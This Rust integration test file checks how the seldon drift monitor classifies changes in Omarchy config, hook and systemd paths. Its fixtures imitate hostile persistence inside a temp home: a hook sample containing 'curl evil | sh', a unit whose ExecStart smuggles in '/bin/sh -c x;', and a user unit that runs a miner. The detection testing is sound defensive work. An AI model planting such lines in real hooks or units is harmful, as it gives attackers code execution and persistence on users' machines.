//! ADR-0028 through the command line (WP-109): the capture-time evidence
//! marks, the built-in templates as rule-7 evidence, the new default watch
//! paths and their upgrade, `doctor`'s rows, and the index build that
//! writes nothing to the ledger. Always through `common::Env` (a temp
//! HOME; Omarchy's tree is `<tmp>/omarchy`, never the host's).

mod common;

use std::path::{Path, PathBuf};

use serde_json::{Value, json};

use common::{Env, Snapper, copy_dir, fixture_logbook, json, read, stderr};

/// The sample index's clock (`fixtures/index.sample.json`).
const GENERATED_AT: &str = "2026-10-01T17:05:12+02:00";

/// `dir` and every directory below it get `mode` (the guard's owner owns
/// them: under `SELDON_TEST_GUARD` that stands in for root).
fn trust(dir: &Path, mode: u32) {
    use std::os::unix::fs::PermissionsExt as _;
    for entry in std::fs::read_dir(dir).unwrap() {
        let p = entry.unwrap().path();
        if p.is_dir() {
            trust(&p, mode);
        }
    }
    std::fs::set_permissions(dir, std::fs::Permissions::from_mode(mode)).unwrap();
}

fn write(path: &Path, text: &str) {
    std::fs::create_dir_all(path.parent().unwrap()).unwrap();
    std::fs::write(path, text).unwrap();
}

fn ok(env: &Env, args: &[&str]) -> Value {
    let out = env.seldon(args);
    assert_eq!(out.status.code(), Some(0), "{args:?}: {}", stderr(&out));
    json(&out)
}

fn capture_config(env: &Env) -> Value {
    ok(env, &["capture", "--source", "config", "--json"])
}

/// `subject → (meta.matches, resolution)` of the config events in the
/// ledger, the last per subject.
fn config_events(root: &Path) -> Vec<(String, Value, Value)> {
    let ledger = common::ledger(root);
    let resolution = |id: &Value| -> Value {
        ledger
            .iter()
            .rev()
            .find(|e| e["kind"] == "resolution" && &e["refersTo"] == id)
            .map(|e| json!([e["resolution"], e["detail"]]))
            .unwrap_or(Value::Null)
    };
    ledger
        .iter()
        .filter(|e| e["source"] == "config")
        .map(|e| {
            (
                e["subject"].as_str().unwrap().to_string(),
                e["meta"]["matches"].clone(),
                resolution(&e["id"]),
            )
        })
        .collect()
}

fn find<'a>(events: &'a [(String, Value, Value)], subject: &str) -> &'a (String, Value, Value) {
    events
        .iter()
        .find(|e| e.0 == subject)
        .unwrap_or_else(|| panic!("{subject} in {events:?}"))
}

/// `seldon drift [--all] --json`: (subject, class, rule) of each item.
fn items(env: &Env, all: bool) -> Vec<(String, String, String)> {
    let mut args = vec!["drift", "--json"];
    if all {
        args.push("--all");
    }
    ok(env, &args)["drift"]
        .as_array()
        .unwrap()
        .iter()
        .map(|d| {
            (
                d["subject"].as_str().unwrap().to_string(),
                d["class"].as_str().unwrap().to_string(),
                d["rule"].as_str().unwrap().to_string(),
            )
        })
        .collect()
}

/// ADR-0028 §5: a new config event carries the evidence it had at
/// capture (`omarchy-default`, `system-link`, `theme-repo`), and the
/// class follows it. `omarchy refresh` writes `<file>.bak.<epoch>` and
/// Omarchy's copy: both routine. A new hook is a crisis.
#[test]
fn capture_marks_the_evidence_and_the_class_follows_it() {
    let env = Env::new(Snapper::Missing);
    env.init_logbook();
    let home = &env.home;
    let omarchy = env.tmp.path().join("omarchy");
    let lua = home.join(".config/hypr/hyprland.lua");
    write(&lua, "-- mine\n");
    capture_config(&env); // baseline

    // `omarchy refresh config hypr/hyprland.lua`
    write(&omarchy.join("config/hypr/hyprland.lua"), "-- Omarchy's\n");
    write(
        &home.join(".config/hypr/hyprland.lua.bak.1786539345"),
        "-- mine\n",
    );
    write(&lua, "-- Omarchy's\n");
    // `omarchy-refresh-applications`
    write(
        &omarchy.join("applications/HEY.desktop"),
        "[Desktop Entry]\nName=HEY\n",
    );
    write(
        &home.join(".local/share/applications/HEY.desktop"),
        "[Desktop Entry]\nName=HEY\n",
    );
    write(
        &omarchy.join("default/alacritty/Alacritty.desktop"),
        "[Desktop Entry]\nName=Alacritty\n",
    );
    write(
        &home.join(".local/share/applications/Alacritty.desktop"),
        "[Desktop Entry]\nName=Alacritty\n",
    );
    // a shipped sample hook, byte-equal
    write(
        &omarchy.join("config/omarchy/hooks/post-update.d/x.sample"),
        "#!/bin/bash\n",
    );
    write(
        &home.join(".config/omarchy/hooks/post-update.d/x.sample"),
        "#!/bin/bash\n",
    );
    // `omarchy theme install`: a clone with its .git; Omarchy strips its code
    write(
        &home.join(".config/omarchy/themes/repo/.git/HEAD"),
        "ref: refs/heads/main\n",
    );
    write(
        &home.join(".config/omarchy/themes/repo/hyprland.lua"),
        "-- theme\n",
    );
    // a theme the user wrote: code is attention, the colours are routine
    write(
        &home.join(".config/omarchy/themes/mine/hyprland.lua"),
        "-- theme\n",
    );
    write(
        &home.join(".config/omarchy/themes/mine/colors.toml"),
        "accent = \"#fff\"\n",
    );
    // `systemctl --user enable` of a packaged unit: a link into /usr
    let usr = Path::new("/usr/lib/os-release");
    let link = home.join(".config/systemd/user/default.target.wants/packaged.service");
    if usr.is_file() {
        std::fs::create_dir_all(link.parent().unwrap()).unwrap();
        std::os::unix::fs::symlink(usr, &link).unwrap();
    }
    // a link that does not point into /usr is no evidence
    let own = home.join("units/miner.service");
    write(&own, "[Service]\nExecStart=/home/user/miner\n");
    let own_link = home.join(".config/systemd/user/miner.service");
    std::fs::create_dir_all(own_link.parent().unwrap()).unwrap();
    std::os::unix::fs::symlink(&own, &own_link).unwrap();
    // persistence nobody asked for
    write(
        &home.join(".config/omarchy/hooks/post-update.d/backup.sh"),
        "#!/bin/bash\nrsync\n",
    );
    // the shell rewrites its state file
    write(&home.join(".config/omarchy/shell.json"), "{}\n");

    trust(&omarchy, 0o755);
    let c = capture_config(&env);
    assert_eq!(c["ok"], true, "{c}");
    let events = config_events(&env.tmp.path().join("logbook"));
    let mark = |s: &str| find(&events, s).1.clone();
    assert_eq!(mark("~/.config/hypr/hyprland.lua"), "omarchy-default");
    assert_eq!(
        mark("~/.config/hypr/hyprland.lua.bak.1786539345"),
        Value::Null
    );
    assert_eq!(
        mark("~/.local/share/applications/HEY.desktop"),
        "omarchy-default"
    );
    assert_eq!(
        mark("~/.local/share/applications/Alacritty.desktop"),
        "omarchy-default"
    );
    assert_eq!(
        mark("~/.config/omarchy/hooks/post-update.d/x.sample"),
        "omarchy-default"
    );
    assert_eq!(
        mark("~/.config/omarchy/themes/repo/hyprland.lua"),
        "theme-repo"
    );
    assert_eq!(
        mark("~/.config/omarchy/themes/mine/hyprland.lua"),
        Value::Null
    );
    assert_eq!(
        mark("~/.config/omarchy/hooks/post-update.d/backup.sh"),
        Value::Null
    );
    assert_eq!(mark("~/.config/systemd/user/miner.service"), Value::Null);
    if usr.is_file() {
        assert_eq!(
            mark("~/.config/systemd/user/default.target.wants/packaged.service"),
            "system-link"
        );
    }

    let mut open = items(&env, false);
    open.sort();
    let item = |s: &str, c: &str, r: &str| (s.to_string(), c.to_string(), r.to_string());
    assert_eq!(
        open,
        [
            item(
                "~/.config/omarchy/hooks/post-update.d/backup.sh",
                "crisis",
                "always-red-paths"
            ),
            item(
                "~/.config/omarchy/themes/mine/hyprland.lua",
                "attention",
                "config"
            ),
            item(
                "~/.config/systemd/user/miner.service",
                "crisis",
                "always-red-paths"
            ),
        ],
        "everything else is routine"
    );
    let rule = |s: &str| -> String {
        items(&env, true)
            .into_iter()
            .find(|i| i.0 == s)
            .map(|i| format!("{} {}", i.1, i.2))
            .unwrap_or_else(|| panic!("{s}"))
    };
    assert_eq!(
        rule("~/.config/hypr/hyprland.lua"),
        "routine omarchy-default"
    );
    assert_eq!(
        rule("~/.config/hypr/hyprland.lua.bak.1786539345"),
        "routine routine-paths"
    );
    assert_eq!(
        rule("~/.config/omarchy/shell.json"),
        "routine routine-paths"
    );
    assert_eq!(
        rule("~/.config/omarchy/themes/mine/colors.toml"),
        "routine theme-assets"
    );
    assert_eq!(
        rule("~/.config/omarchy/themes/repo/hyprland.lua"),
        "routine theme-repo"
    );
    if usr.is_file() {
        assert_eq!(
            rule("~/.config/systemd/user/default.target.wants/packaged.service"),
            "routine system-link"
        );
    }
    // the ledger holds the fact, never the target or the content
    let ledger = read(&env.tmp.path().join("logbook/ledger").join(month(&env)));
    assert!(!ledger.contains("os-release"), "{ledger}");
}

/// The ledger month file a real-clock capture wrote.
fn month(env: &Env) -> PathBuf {
    let dir = env.tmp.path().join("logbook/ledger");
    std::fs::read_dir(&dir)
        .unwrap()
        .map(|e| e.unwrap().path())
        .find(|p| p.extension().is_some_and(|x| x == "jsonl"))
        .map(|p| PathBuf::from(p.file_name().unwrap()))
        .unwrap()
}

/// ADR-0028 §2 rule 7: the engine's built-in templates explain a config
/// event without `owned.json` (a lost state directory, `install.sh
/// --unit` with any prefix); a unit that differs in more than its
/// `ExecStart` stays a crisis.
#[test]
fn built_in_templates_explain_without_owned_json() {
    let env = Env::new(Snapper::Missing);
    env.init_logbook();
    let home = &env.home;
    capture_config(&env); // baseline
    let owned = home.join(".local/state/seldon/owned.json");
    assert!(!owned.exists());

    let unit = seldon::collectors::config::WATCH_UNIT;
    let default = "ExecStart=%h/.local/bin/seldon watch";
    assert!(unit.contains(&format!("\n{default}\n")));
    let units = home.join(".config/systemd/user");
    // this engine, by its own path (`install.sh --unit --prefix …`)
    let engine = Path::new(env!("CARGO_BIN_EXE_seldon"));
    let prefix = engine.parent().unwrap().display().to_string();
    let own = unit.replace(default, &format!("ExecStart={prefix}/seldon watch"));
    write(&units.join("seldon-watch.service"), &own);
    // this engine, copied to `~/.local/bin` (same content)
    let copy = home.join(".local/bin/seldon");
    std::fs::create_dir_all(copy.parent().unwrap()).unwrap();
    std::fs::copy(engine, &copy).unwrap();
    write(
        &units.join("default.target.wants/seldon-watch.service"),
        unit,
    );
    // a foreign `seldon` the template would otherwise vouch for
    write(&home.join(".cache/evil/seldon"), "#!/bin/sh\nexec miner\n");
    let foreign = unit.replace(default, "ExecStart=%h/.cache/evil/seldon watch");
    write(
        &units.join("evil.target.wants/seldon-watch.service"),
        &foreign,
    );
    let tampered = unit.replace(default, &format!("ExecStartPre=/tmp/x\n{default}"));
    write(
        &units.join("other.target.wants/seldon-watch.service"),
        &tampered,
    );
    let spaced = unit.replace(default, "ExecStart=/bin/sh -c x; /seldon watch");
    write(
        &units.join("third.target.wants/seldon-watch.service"),
        &spaced,
    );
    // the template with a line appended
    write(
        &units.join("fourth.target.wants/seldon-watch.service"),
        &format!("{unit}ExecStartPost=/tmp/x\n"),
    );
    write(
        &home.join(".config/omarchy/hooks/theme-set.d/seldon-theme-set.sh"),
        seldon::commands::setup::THEME_HOOK_SCRIPT,
    );
    // the same bytes under another name are no template
    write(
        &home.join(".config/omarchy/hooks/theme-set.d/copy.sh"),
        seldon::commands::setup::THEME_HOOK_SCRIPT,
    );

    let c = capture_config(&env);
    assert_eq!(c["explainedOwn"], 3, "{c}");
    let events = config_events(&env.tmp.path().join("logbook"));
    let res = |s: &str| find(&events, s).2.clone();
    assert_eq!(
        res("~/.config/systemd/user/seldon-watch.service"),
        json!([
            "explained",
            "installed by install.sh --unit (built-in template)"
        ])
    );
    assert_eq!(
        res("~/.config/omarchy/hooks/theme-set.d/seldon-theme-set.sh"),
        json!([
            "explained",
            "installed by seldon init --theme-hook (built-in template)"
        ])
    );
    assert_eq!(
        res("~/.config/systemd/user/default.target.wants/seldon-watch.service"),
        json!([
            "explained",
            "installed by install.sh --unit (built-in template)"
        ])
    );
    for s in [
        "~/.config/systemd/user/evil.target.wants/seldon-watch.service",
        "~/.config/systemd/user/other.target.wants/seldon-watch.service",
        "~/.config/systemd/user/third.target.wants/seldon-watch.service",
        "~/.config/systemd/user/fourth.target.wants/seldon-watch.service",
        "~/.config/omarchy/hooks/theme-set.d/copy.sh",
    ] {
        assert_eq!(res(s), Value::Null, "{s}");
    }
    let crises: Vec<String> = items(&env, false)
        .into_iter()
        .filter(|i| i.1 == "crisis")
        .map(|i| i.0)
        .collect();
    assert_eq!(crises.len(), 5, "{crises:?}");
    assert!(!owned.exists(), "nothing recorded, nothing left behind");
}

/// ADR-0028 §4d: `init` writes the six persistence paths (and WP-113's
/// toggles directory); a config whose list is an earlier engine's default
/// (0.1.0–0.1.3, WP-089, 0.1.4) gains them at the next capture,
/// which says so once; a list the user wrote is never widened, and
/// `doctor` names what it lacks with the line to add.
#[test]
fn default_watch_paths_and_their_upgrade() {
    let env = Env::new(Snapper::Missing);
    env.init_logbook();
    let config = || -> toml::Table { read(&env.config_file()).parse().unwrap() };
    let watch = |t: &toml::Table| -> Vec<String> {
        t["watchPaths"]
            .as_array()
            .unwrap()
            .iter()
            .map(|v| v.as_str().unwrap().to_string())
            .collect()
    };
    assert_eq!(watch(&config()), seldon::config::DEFAULT_WATCH_PATHS);

    for earlier in seldon::config::EARLIER_DEFAULT_WATCH_PATHS {
        let mut t = config();
        t["watchPaths"] = toml::Value::Array(
            earlier
                .iter()
                .rev()
                .map(|p| toml::Value::String(p.to_string()))
                .collect(),
        );
        std::fs::write(env.config_file(), toml::to_string(&t).unwrap()).unwrap();
        let d = ok(&env, &["doctor", "--json"]);
        let row = row(&d, "watch");
        assert_eq!(row["status"], "ok", "{row}");
        assert!(
            row["message"]
                .as_str()
                .unwrap()
                .contains("the next capture adds"),
            "{row}"
        );

        let c = capture_config(&env);
        let added: Vec<String> = c["watchPathsAdded"]
            .as_array()
            .unwrap()
            .iter()
            .map(|v| v.as_str().unwrap().to_string())
            .collect();
        let missing: Vec<String> = seldon::config::DEFAULT_WATCH_PATHS
            .iter()
            .filter(|p| !earlier.contains(p))
            .map(|p| p.to_string())
            .collect();
        assert_eq!(added, missing);
        // every earlier list lacks the toggles directory (WP-113)
        assert!(added.iter().any(|p| p == "~/.local/state/omarchy/toggles"));
        let mut have = watch(&config());
        have.sort();
        let mut want: Vec<String> = seldon::config::DEFAULT_WATCH_PATHS
            .iter()
            .map(|s| s.to_string())
            .collect();
        want.sort();
        assert_eq!(have, want);
        // once
        let again = capture_config(&env);
        assert_eq!(again["watchPathsAdded"], json!([]), "{again}");
    }
    // the human output says it
    let mut t = config();
    t["watchPaths"] = toml::Value::Array(
        seldon::config::EARLIER_DEFAULT_WATCH_PATHS[0]
            .iter()
            .map(|p| toml::Value::String(p.to_string()))
            .collect(),
    );
    std::fs::write(env.config_file(), toml::to_string(&t).unwrap()).unwrap();
    let out = env.seldon(&["capture", "--source", "config"]);
    let text = common::stdout(&out);
    assert!(
        text.contains("note: config.toml now also watches ~/.local/share/applications, ~/.config/systemd/user,"),
        "{text}"
    );

    // K15: an earlier default plus a path of the user's own is the user's
    let mut t = config();
    let mut superset: Vec<toml::Value> = seldon::config::EARLIER_DEFAULT_WATCH_PATHS[1]
        .iter()
        .map(|p| toml::Value::String(p.to_string()))
        .collect();
    superset.push(toml::Value::String("~/dotfiles".into()));
    t["watchPaths"] = toml::Value::Array(superset);
    std::fs::write(env.config_file(), toml::to_string(&t).unwrap()).unwrap();
    assert_eq!(capture_config(&env)["watchPathsAdded"], json!([]));
    assert_eq!(watch(&config()).len(), 7, "never widened");
    // a list of the user's own: kept, and doctor says what it lacks
    let mut t = config();
    t["watchPaths"] = toml::Value::Array(vec![
        toml::Value::String("~/.config/hypr".into()),
        toml::Value::String("~/dotfiles".into()),
    ]);
    std::fs::write(env.config_file(), toml::to_string(&t).unwrap()).unwrap();
    let c = capture_config(&env);
    assert_eq!(c["watchPathsAdded"], json!([]));
    assert_eq!(watch(&config()), ["~/.config/hypr", "~/dotfiles"]);
    let d = ok(&env, &["doctor", "--json"]);
    let row = row(&d, "watch");
    assert_eq!(row["status"], "degraded", "{row}");
    let message = row["message"].as_str().unwrap();
    assert!(
        message.contains("~/.config/systemd/user") && message.contains("~/.bash_profile"),
        "{row}"
    );
    assert!(!message.contains("~/.config/hypr,"), "{row}");
    assert!(
        row["fix"]
            .as_str()
            .unwrap()
            .starts_with("add to watchPaths in config.toml: \"~/.config/omarchy\", "),
        "{row}"
    );
}

fn row(doctor: &Value, name: &str) -> Value {
    doctor["checks"]
        .as_array()
        .unwrap()
        .iter()
        .find(|c| c["name"] == name)
        .cloned()
        .unwrap_or_else(|| panic!("no {name} row: {doctor}"))
}

/// ADR-0028 §4c, §6: `doctor` prints the effective `[drift]` set and marks
/// what differs from the default; an unknown routine rule is degraded.
#[test]
fn doctor_shows_the_drift_rules() {
    let env = Env::new(Snapper::Missing);
    env.init_logbook();
    let d = ok(&env, &["doctor", "--json"]);
    let r = row(&d, "drift");
    assert_eq!(r["status"], "ok");
    assert!(
        r["message"].as_str().unwrap().contains("; all defaults; "),
        "{r}"
    );
    assert!(
        r["message"].as_str().unwrap().ends_with(
            "omarchy does not exist (it must be root's and neither group- nor world-writable)"
        ),
        "{r}"
    );
    assert_eq!(d["drift"]["attention"], "normal");
    assert_eq!(d["drift"]["nonDefault"], json!([]));
    assert_eq!(
        d["drift"]["routine"].as_array().unwrap().len(),
        seldon::config::ROUTINE_RULES.len()
    );
    // a default config does not write the new keys (a later engine's
    // defaults reach it)
    let text = read(&env.config_file());
    assert!(text.contains("alwaysRed"), "{text}");
    assert!(
        !text.contains("routinePaths") && !text.contains("attention"),
        "{text}"
    );

    let mut t: toml::Table = text.parse().unwrap();
    let drift = t["drift"].as_table_mut().unwrap();
    drift.insert("attention".into(), toml::Value::String("all".into()));
    drift.insert(
        "routine".into(),
        toml::Value::Array(vec![
            toml::Value::String("sysupgrade".into()),
            toml::Value::String("themes".into()),
        ]),
    );
    std::fs::write(env.config_file(), toml::to_string(&t).unwrap()).unwrap();
    let d = env.seldon(&["doctor", "--json"]);
    let d = json(&d);
    let r = row(&d, "drift");
    assert_eq!(r["status"], "degraded", "{r}");
    let message = r["message"].as_str().unwrap();
    assert!(
        message.starts_with("attention all · routine: sysupgrade, themes ·"),
        "{r}"
    );
    assert!(message.contains("non-default: attention, routine"), "{r}");
    assert!(message.ends_with("unknown routine rule(s): themes"), "{r}");
    assert!(r["fix"].as_str().unwrap().contains("theme-assets"), "{r}");
    assert_eq!(d["drift"]["nonDefault"], json!(["attention", "routine"]));
}

/// ADR-0028 §5: the class is computed at index time; nothing is written to
/// the ledger, and two builds from the same ledger and config are byte
/// identical. Reading commands (`drift`, `--all`, `show`, `status`) write
/// no ledger line either.
#[test]
fn index_builds_are_identical_and_write_no_ledger_line() {
    let env = Env::new(Snapper::Missing);
    let lb = env.tmp.path().join("logbook");
    copy_dir(&fixture_logbook(), &lb);
    let ledger = |lb: &Path| -> Vec<(String, Vec<u8>)> {
        let mut files: Vec<(String, Vec<u8>)> = std::fs::read_dir(lb.join("ledger"))
            .unwrap()
            .map(|e| e.unwrap().path())
            .filter(|p| p.extension().is_some_and(|x| x == "jsonl"))
            .map(|p| (p.display().to_string(), std::fs::read(&p).unwrap()))
            .collect();
        files.sort();
        files
    };
    let before = ledger(&lb);
    let index_file = env.home.join(".local/state/seldon/index.json");
    let lbs = lb.to_str().unwrap();
    let build = || {
        let out = env.at(GENERATED_AT, &["--logbook", lbs, "index", "--json"]);
        assert_eq!(out.status.code(), Some(0), "{}", stderr(&out));
        std::fs::read(&index_file).unwrap()
    };
    let first = build();
    for args in [
        &["drift"][..],
        &["drift", "--all"],
        &["drift", "--crisis-only"],
        &["drift", "show", "01M3SXBQVR7AW8PJQC1YXDCQ14"],
        &["status"],
    ] {
        let mut all = vec!["--logbook", lbs];
        all.extend_from_slice(args);
        let out = env.at(GENERATED_AT, &all);
        assert_eq!(out.status.code(), Some(0), "{args:?}: {}", stderr(&out));
    }
    let second = build();
    assert_eq!(first, second, "byte-identical");
    assert_eq!(ledger(&lb), before, "no ledger line written");
}

/// WP-109 round 1b (operator decision): Omarchy's tree counts as evidence
/// only when it is root's (here: the test guard's owner) and neither group-
/// nor world-writable, the directories down to the copy included; else a
/// byte-equal copy is an ordinary override, and `doctor` says why.
#[test]
fn omarchy_path_counts_only_when_trusted() {
    use std::os::unix::fs::PermissionsExt as _;
    let env = Env::new(Snapper::Missing);
    env.init_logbook();
    let omarchy = env.tmp.path().join("omarchy");
    let lua = |n: u32| env.home.join(format!(".config/hypr/h{n}.lua"));
    let shipped = |n: u32| omarchy.join(format!("config/hypr/h{n}.lua"));
    for n in 1..=3 {
        write(&lua(n), "-- mine\n");
        write(&shipped(n), &format!("-- Omarchy's {n}\n"));
    }
    capture_config(&env); // baseline
    let marks = || -> Vec<(String, Value)> {
        config_events(&env.tmp.path().join("logbook"))
            .into_iter()
            .map(|(s, m, _)| (s, m))
            .collect()
    };
    let row = |d: &Value| row(d, "drift")["message"].as_str().unwrap().to_string();

    // trusted: the copy is Omarchy's
    trust(&omarchy, 0o755);
    write(&lua(1), "-- Omarchy's 1\n");
    capture_config(&env);
    assert!(row(&ok(&env, &["doctor", "--json"])).ends_with(&format!(
        "; Omarchy's copies count as evidence ({})",
        omarchy.display()
    )));
    // group-writable tree: no evidence, an ordinary override
    std::fs::set_permissions(&omarchy, std::fs::Permissions::from_mode(0o775)).unwrap();
    write(&lua(2), "-- Omarchy's 2\n");
    capture_config(&env);
    let d = ok(&env, &["doctor", "--json"]);
    assert!(
        row(&d).ends_with(
            "omarchy is group-writable (it must be root's and neither group- nor world-writable)"
        ),
        "{}",
        row(&d)
    );
    // trusted tree, but a writable directory on the way to the copy
    std::fs::set_permissions(&omarchy, std::fs::Permissions::from_mode(0o755)).unwrap();
    std::fs::set_permissions(
        omarchy.join("config"),
        std::fs::Permissions::from_mode(0o777),
    )
    .unwrap();
    write(&lua(3), "-- Omarchy's 3\n");
    capture_config(&env);
    trust(&omarchy, 0o755);

    let got = marks();
    let mark = |n: u32| {
        got.iter()
            .rev()
            .find(|(s, _)| s == &format!("~/.config/hypr/h{n}.lua"))
            .unwrap()
            .1
            .clone()
    };
    assert_eq!(mark(1), "omarchy-default");
    assert_eq!(mark(2), Value::Null, "a group-writable tree is no evidence");
    assert_eq!(
        mark(3),
        Value::Null,
        "a writable directory on the way is no evidence"
    );
    let open: Vec<String> = items(&env, false).into_iter().map(|i| i.0).collect();
    assert!(
        open.contains(&"~/.config/hypr/h2.lua".to_string()),
        "{open:?}"
    );
    assert!(
        open.contains(&"~/.config/hypr/h3.lua".to_string()),
        "{open:?}"
    );
    assert!(
        !open.contains(&"~/.config/hypr/h1.lua".to_string()),
        "{open:?}"
    );
}

/// WP-109 round 2, B1 and B2 through a capture: a file named like a
/// backup in a persistence path is a crisis; a real `omarchy refresh`
/// pair there (backup = the old content, base = Omarchy's default) is
/// routine on both sides; a theme with a `.git` file or a `.git` link is
/// no cloned theme.
#[test]
fn persistence_backups_need_evidence_and_theme_repos_a_real_git() {
    let env = Env::new(Snapper::Missing);
    env.init_logbook();
    let home = &env.home;
    let omarchy = env.tmp.path().join("omarchy");
    write(&home.join(".config/uwsm/env"), "export OLD=1\n");
    write(&omarchy.join("config/uwsm/env"), "export DEFAULT=1\n");
    trust(&omarchy, 0o755);
    capture_config(&env); // baseline

    // `omarchy refresh config uwsm/env`
    write(
        &home.join(".config/uwsm/env.bak.1786539345"),
        "export OLD=1\n",
    );
    write(&home.join(".config/uwsm/env"), "export DEFAULT=1\n");
    // the reviewer's probes: backups nothing vouches for, all loaded
    for p in [
        ".config/omarchy/hooks/post-update.d/evil.bak.sh",
        ".config/systemd/user/evil.bak.service",
        ".config/autostart/evil.bak.desktop",
        ".config/environment.d/50-evil.bak.conf",
    ] {
        write(&home.join(p), "evil\n");
    }
    // B2: a `.git` file and a `.git` link are no clone
    write(
        &home.join(".config/omarchy/themes/fake/.git"),
        "gitdir: x\n",
    );
    write(
        &home.join(".config/omarchy/themes/fake/hyprland.lua"),
        "-- theme\n",
    );
    std::fs::create_dir_all(env.tmp.path().join("realgit")).unwrap();
    std::fs::create_dir_all(home.join(".config/omarchy/themes/linked")).unwrap();
    std::os::unix::fs::symlink(
        env.tmp.path().join("realgit"),
        home.join(".config/omarchy/themes/linked/.git"),
    )
    .unwrap();
    write(
        &home.join(".config/omarchy/themes/linked/hyprland.lua"),
        "-- theme\n",
    );
    capture_config(&env);

    let all = items(&env, true);
    let class = |s: &str| -> String {
        all.iter()
            .find(|i| i.0 == s)
            .map(|i| format!("{} {}", i.1, i.2))
            .unwrap_or_else(|| panic!("{s} in {all:?}"))
    };
    assert_eq!(class("~/.config/uwsm/env"), "routine omarchy-default");
    assert_eq!(
        class("~/.config/uwsm/env.bak.1786539345"),
        "routine routine-paths"
    );
    for p in [
        "~/.config/omarchy/hooks/post-update.d/evil.bak.sh",
        "~/.config/systemd/user/evil.bak.service",
        "~/.config/autostart/evil.bak.desktop",
        "~/.config/environment.d/50-evil.bak.conf",
    ] {
        assert_eq!(class(p), "crisis always-red-paths", "{p}");
    }
    assert_eq!(
        class("~/.config/omarchy/themes/fake/hyprland.lua"),
        "attention config"
    );
    assert_eq!(
        class("~/.config/omarchy/themes/linked/hyprland.lua"),
        "attention config"
    );
}

/// WP-109 round 2 (N5): the watch-path upgrade keeps `config.toml` as the
/// user wrote it, comments and order included, except for the added
/// paths; a file it cannot extend that way stays untouched, the capture
/// says so, and doctor names the paths.
#[test]
fn the_watch_path_upgrade_keeps_the_file() {
    let env = Env::new(Snapper::Missing);
    env.init_logbook();
    let generated = read(&env.config_file());
    let earlier: Vec<String> = seldon::config::EARLIER_DEFAULT_WATCH_PATHS[1]
        .iter()
        .map(|p| format!("\"{p}\""))
        .collect();
    let mut t: toml::Table = generated.parse().unwrap();
    t.remove("watchPaths");
    let rest = toml::to_string(&t).unwrap();
    let text = format!(
        "# my comment\nwatchPaths = [\n  {},\n] # keep\n{rest}",
        earlier.join(", # x\n  ")
    );
    std::fs::write(env.config_file(), &text).unwrap();
    let c = capture_config(&env);
    let added = seldon::config::DEFAULT_WATCH_PATHS[6..].to_vec();
    assert_eq!(c["watchPathsAdded"], json!(added));
    let quoted: Vec<String> = added.iter().map(|p| format!(", \"{p}\"")).collect();
    let last = earlier.last().unwrap();
    let want = text.replacen(
        &format!("{last},\n]"),
        &format!("{last}{},\n]", quoted.concat()),
        1,
    );
    assert_eq!(read(&env.config_file()), want);

    // a quoted key: not edited, nothing watched beyond the list, doctor says it
    let text = format!("\"watchPaths\" = [{}]\n{rest}", earlier.join(", "));
    std::fs::write(env.config_file(), &text).unwrap();
    let c = capture_config(&env);
    assert_eq!(c["watchPathsAdded"], json!([]));
    assert!(
        c["warnings"].as_array().unwrap().iter().any(|w| w
            .as_str()
            .unwrap()
            .starts_with("config.toml was left as it is")),
        "{c}"
    );
    assert_eq!(read(&env.config_file()), text);
    let d = ok(&env, &["doctor", "--json"]);
    let r = row(&d, "watch");
    assert_eq!(r["status"], "degraded", "{r}");
    assert!(
        r["message"]
            .as_str()
            .unwrap()
            .contains("an earlier default list, but config.toml cannot be extended"),
        "{r}"
    );
}

/// WP-109 round 3 (B5, stage 2): `omarchy-hook` runs every file in a
/// `<name>.d/` except `*.sample`, so a backup of a sample there runs: a
/// crisis, even though it holds the sample's last recorded content. The
/// edited sample itself stays quiet attention.
#[test]
fn a_backup_of_a_hook_sample_is_a_crisis() {
    let env = Env::new(Snapper::Missing);
    env.init_logbook();
    let hooks = env.home.join(".config/omarchy/hooks/post-update.d");
    std::fs::create_dir_all(&hooks).unwrap();
    capture_config(&env); // baseline
    write(&hooks.join("x.sample"), "#!/bin/bash\ncurl evil | sh\n");
    capture_config(&env);
    // a later second: the backup follows the sample's recorded state, so
    // the base-content evidence holds and only the hooks rule decides
    std::thread::sleep(std::time::Duration::from_millis(1100));
    std::fs::copy(
        hooks.join("x.sample"),
        hooks.join("x.sample.bak.1786539345"),
    )
    .unwrap();
    capture_config(&env);
    let all = items(&env, true);
    let class = |s: &str| -> String {
        all.iter()
            .find(|i| i.0 == s)
            .map(|i| format!("{} {}", i.1, i.2))
            .unwrap_or_else(|| panic!("{s} in {all:?}"))
    };
    assert_eq!(
        class("~/.config/omarchy/hooks/post-update.d/x.sample"),
        "attention config"
    );
    assert_eq!(
        class("~/.config/omarchy/hooks/post-update.d/x.sample.bak.1786539345"),
        "crisis always-red-paths"
    );
}
